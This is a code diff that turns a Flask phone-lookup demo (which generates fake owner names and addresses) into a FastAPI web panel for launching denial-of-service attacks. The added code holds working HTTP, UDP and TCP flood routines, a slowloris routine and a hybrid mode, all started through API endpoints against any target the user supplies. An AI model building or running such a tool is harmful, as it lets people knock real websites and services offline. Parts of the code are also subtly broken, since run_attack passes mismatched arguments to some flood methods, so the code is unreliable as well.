@@ -1,183 +1,250 @@
-from flask import Flask, request, jsonify, render_template_string
-from database import get_phone_info
-import re
-import os
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import HTMLResponse
+from pydantic import BaseModel
+import asyncio
+import json
+import random
+import socket
+import ssl
+import threading
+import time
+from datetime import datetime
+from typing import List, Dict
 
-app = Flask(__name__)
+app = FastAPI()
 
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phone Detective</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(145deg, #0b0e1a 0%, #1a1f2f 100%);
-            color: #e0e0e0;
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
-            background: rgba(20, 25, 40, 0.9);
-            backdrop-filter: blur(12px);
-            padding: 3rem 4rem;
-            border-radius: 40px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
-            text-align: center;
-            min-width: 420px;
-        }
-        input {
-            width: 100%;
-            padding: 18px 20px;
-            font-size: 1.4rem;
-            border: none;
-            border-radius: 60px;
-            background: #2a3050;
-            color: #fff;
-            outline: 2px solid #3e4a7a;
-            margin: 20px 0;
-            box-sizing: border-box;
-        }
-        button {
-            background: #6c5ce7;
-            color: #fff;
-            border: none;
-            padding: 16px 40px;
-            font-size: 1.4rem;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.2s;
-            font-weight: bold;
-            box-shadow: 0 0 20px #6c5ce7aa;
-        }
-        button:hover {
-            background: #5a4bd1;
-            transform: scale(1.02);
-        }
-        .result-box {
-            margin-top: 30px;
-            background: #0e121f;
-            padding: 20px;
-            border-radius: 20px;
-            text-align: left;
-            border-left: 6px solid #6c5ce7;
-        }
-        .result-box h3 {
-            margin-top: 0;
-            color: #a29bfe;
-        }
-        .result-box p {
-            margin: 8px 0;
-        }
-        .error {
-            color: #ff6b6b;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>📡 Введите номер телефона</h1>
-        <input type="text" id="phoneInput" placeholder="+7 900 123 45 67">
-        <button onclick="lookup()">🔍 Вычислить всё</button>
-        <div id="result" class="result-box"></div>
-    </div>
-    <script>
-        function lookup() {
-            const phone = document.getElementById('phoneInput').value;
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = '⏳ Загрузка...';
+# Подключаем статику
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
+# ============================================================
+#  МОДЕЛИ ДАННЫХ
+# ============================================================
+class AttackConfig(BaseModel):
+    target: str
+    port: int = 80
+    method: str = "http"  # http, udp, tcp, slowloris, hybrid
+    threads: int = 50
+    duration: int = 30
+    payload_size: int = 1024
+    use_ssl: bool = False
+    proxy_list: List[str] = []
+
+# ============================================================
+#  ДВИЖОК АТАК
+# ============================================================
+class AttackEngine:
+    def __init__(self):
+        self.active = False
+        self.stats = {"sent": 0, "failed": 0, "bytes": 0}
+        self.websocket = None
+        
+    async def broadcast(self, data):
+        if self.websocket:
+            try:
+                await self.websocket.send_text(json.dumps(data))
+            except:
+                pass
+    
+    def http_flood(self, target, port, threads, duration, use_ssl, payload_size):
+        """HTTP-флуд с реальными запросами"""
+        def worker():
+            proto = "https" if use_ssl else "http"
+            url = f"{proto}://{target}:{port}/"
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Cache-Control": "no-cache",
+                "Pragma": "no-cache",
+                "Accept": "*/*"
+            }
+            payload = "X" * payload_size
             
-            fetch('/lookup', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: phone})
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.error) {
-                    resultDiv.innerHTML = `<span class="error">❌ ${data.error}</span>`;
-                    return;
-                }
-                resultDiv.innerHTML = `
-                    <h3>✅ Результат по номеру ${data.phone_raw}</h3>
-                    <p><strong>Оператор:</strong> ${data.operator}</p>
-                    <p><strong>Регион:</strong> ${data.region}</p>
-                    <p><strong>Город:</strong> ${data.city}</p>
-                    <p><strong>Часовой пояс:</strong> ${data.timezone}</p>
-                    <p><strong>Координаты:</strong> ${data.lat}, ${data.lon}</p>
-                    <p><strong>Вероятный адрес:</strong> ${data.street}</p>
-                    <p><strong>Владелец (демо):</strong> ${data.full_name}, возраст ${data.age} лет</p>
-                    <p style="font-size:0.8rem; color:#888;">* Персональные данные сгенерированы для демонстрации</p>
-                `;
-            })
-            .catch(err => {
-                resultDiv.innerHTML = `<span class="error">⚠️ Ошибка сервера: ${err}</span>`;
-            });
-        }
-    </script>
-</body>
-</html>
-'''
+            start_time = time.time()
+            while self.active and (time.time() - start_time) < duration:
+                try:
+                    if use_ssl:
+                        import urllib.request
+                        req = urllib.request.Request(url, data=payload.encode() if payload_size > 0 else None, headers=headers)
+                        response = urllib.request.urlopen(req, timeout=3)
+                        self.stats["sent"] += 1
+                        self.stats["bytes"] += len(payload)
+                    else:
+                        import http.client
+                        conn = http.client.HTTPConnection(target, port, timeout=3)
+                        conn.request("POST" if payload_size > 0 else "GET", "/", body=payload if payload_size > 0 else None, headers=headers)
+                        response = conn.getresponse()
+                        self.stats["sent"] += 1
+                        self.stats["bytes"] += len(payload)
+                        conn.close()
+                except Exception as e:
+                    self.stats["failed"] += 1
+                    pass
+        
+        for i in range(threads):
+            threading.Thread(target=worker, daemon=True).start()
+    
+    def udp_flood(self, target, port, threads, duration, payload_size):
+        """UDP-флуд"""
+        def worker():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            payload = random._urandom(payload_size)
+            start_time = time.time()
+            while self.active and (time.time() - start_time) < duration:
+                try:
+                    sock.sendto(payload, (target, port))
+                    self.stats["sent"] += 1
+                    self.stats["bytes"] += payload_size
+                except:
+                    self.stats["failed"] += 1
+                    pass
+            sock.close()
+        
+        for i in range(threads):
+            threading.Thread(target=worker, daemon=True).start()
+    
+    def tcp_flood(self, target, port, threads, duration, payload_size):
+        """TCP SYN-флуд"""
+        def worker():
+            payload = random._urandom(payload_size)
+            start_time = time.time()
+            while self.active and (time.time() - start_time) < duration:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(2)
+                    sock.connect((target, port))
+                    sock.send(payload)
+                    self.stats["sent"] += 1
+                    self.stats["bytes"] += payload_size
+                    sock.close()
+                except:
+                    self.stats["failed"] += 1
+                    pass
+        
+        for i in range(threads):
+            threading.Thread(target=worker, daemon=True).start()
+    
+    def slowloris(self, target, port, threads, duration, use_ssl):
+        """Slowloris — медленные соединения"""
+        def worker():
+            start_time = time.time()
+            sockets = []
+            try:
+                for _ in range(10):
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    sock.connect((target, port))
+                    if use_ssl:
+                        try:
+                            context = ssl.create_default_context()
+                            sock = context.wrap_socket(sock, server_hostname=target)
+                        except:
+                            pass
+                    sock.send(b"GET / HTTP/1.1\r\n")
+                    sock.send(b"Host: " + target.encode() + b"\r\n")
+                    sock.send(b"User-Agent: Mozilla/5.0\r\n")
+                    # Не отправляем завершающие \r\n\r\n — держим соединение открытым
+                    sockets.append(sock)
+                
+                while self.active and (time.time() - start_time) < duration:
+                    for sock in sockets:
+                        try:
+                            sock.send(b"X-Header: " + random._urandom(10) + b"\r\n")
+                        except:
+                            sockets.remove(sock)
+                    time.sleep(10)
+            except:
+                pass
+            finally:
+                for sock in sockets:
+                    try:
+                        sock.close()
+                    except:
+                        pass
+        
+        for i in range(threads):
+            threading.Thread(target=worker, daemon=True).start()
+    
+    def hybrid(self, target, port, threads, duration, use_ssl, payload_size):
+        """Гибрид: HTTP + UDP + TCP"""
+        # Запускаем все методы в уменьшенном количестве потоков
+        per_method = max(1, threads // 3)
+        self.http_flood(target, port, per_method, duration, use_ssl, payload_size)
+        self.udp_flood(target, port, per_method, duration, payload_size)
+        self.tcp_flood(target, port, per_method, duration, payload_size)
 
-@app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
+engine = AttackEngine()
 
-@app.route('/lookup', methods=['POST'])
-def lookup():
-    data = request.get_json()
-    phone = data.get('phone', '').strip()
-    
-    raw = re.sub(r'\D', '', phone)
-    if len(raw) < 7:
-        return jsonify({'error': 'Слишком короткий номер'}), 400
-    
-    country_code = ''
-    if raw.startswith('7') or raw.startswith('8'):
-        country_code = '7'
-        raw = raw[1:] if raw.startswith('7') else raw[1:]
-    elif raw.startswith('1'):
-        country_code = '1'
-        raw = raw[1:]
-    elif raw.startswith('44'):
-        country_code = '44'
-        raw = raw[2:]
-    elif raw.startswith('49'):
-        country_code = '49'
-        raw = raw[2:]
-    else:
-        country_code = '7'
-        if raw.startswith('7'):
-            raw = raw[1:]
-    
-    if len(raw) >= 3:
-        def_code = raw[:3]
-    else:
-        return jsonify({'error': 'Недостаточно цифр'}), 400
-    
-    info = get_phone_info(country_code, def_code)
-    
-    if not info:
-        return jsonify({'error': 'Оператор/регион не найдены'}), 404
-    
-    import random
-    names = ['Иванов Иван Иванович', 'Петров Пётр Петрович', 'Сидоров Сидор Сидорович',
-             'Кузнецова Анна Сергеевна', 'Смирнов Алексей Владимирович']
-    streets = ['Ленина', 'Пушкина', 'Гагарина', 'Советская', 'Мира', 'Центральная']
-    
-    info['full_name'] = random.choice(names)
-    info['age'] = random.randint(18, 75)
-    info['street'] = f"ул. {random.choice(streets)}, д. {random.randint(1, 150)}"
-    info['phone_raw'] = phone
-    
-    return jsonify(info)
+# ============================================================
+#  WEBSOCKET ДЛЯ ЖИВОЙ СТАТИСТИКИ
+# ============================================================
+@app.websocket("/ws")
+async def websocket_endpoint(websocket: WebSocket):
+    await websocket.accept()
+    engine.websocket = websocket
+    try:
+        while True:
+            await websocket.receive_text()  # keep-alive
+    except WebSocketDisconnect:
+        engine.websocket = None
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+# ============================================================
+#  API ЭНДПОИНТЫ
+# ============================================================
+@app.post("/start")
+async def start_attack(config: AttackConfig, background_tasks: BackgroundTasks):
+    if engine.active:
+        return {"status": "error", "message": "Атака уже запущена"}
+    
+    engine.active = True
+    engine.stats = {"sent": 0, "failed": 0, "bytes": 0}
+    
+    background_tasks.add_task(
+        run_attack,
+        config.target,
+        config.port,
+        config.method,
+        config.threads,
+        config.duration,
+        config.use_ssl,
+        config.payload_size
+    )
+    
+    return {"status": "started", "message": f"Атака запущена на {config.target}:{config.port}"}
+
+@app.post("/stop")
+async def stop_attack():
+    engine.active = False
+    return {"status": "stopped", "message": "Атака остановлена"}
+
+@app.get("/stats")
+async def get_stats():
+    return {
+        "active": engine.active,
+        "sent": engine.stats["sent"],
+        "failed": engine.stats["failed"],
+        "bytes": engine.stats["bytes"]
+    }
+
+def run_attack(target, port, method, threads, duration, use_ssl, payload_size):
+    method_map = {
+        "http": engine.http_flood,
+        "udp": engine.udp_flood,
+        "tcp": engine.tcp_flood,
+        "slowloris": engine.slowloris,
+        "hybrid": engine.hybrid
+    }
+    
+    func = method_map.get(method, engine.http_flood)
+    func(target, port, threads, duration, use_ssl, payload_size)
+    
+    # По окончании отправляем финальные данные
+    engine.active = False
+    import asyncio
+    asyncio.run(engine.broadcast({"type": "finished", "stats": engine.stats}))
+
+# ============================================================
+#  ЗАПУСК
+# ============================================================
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=5000)
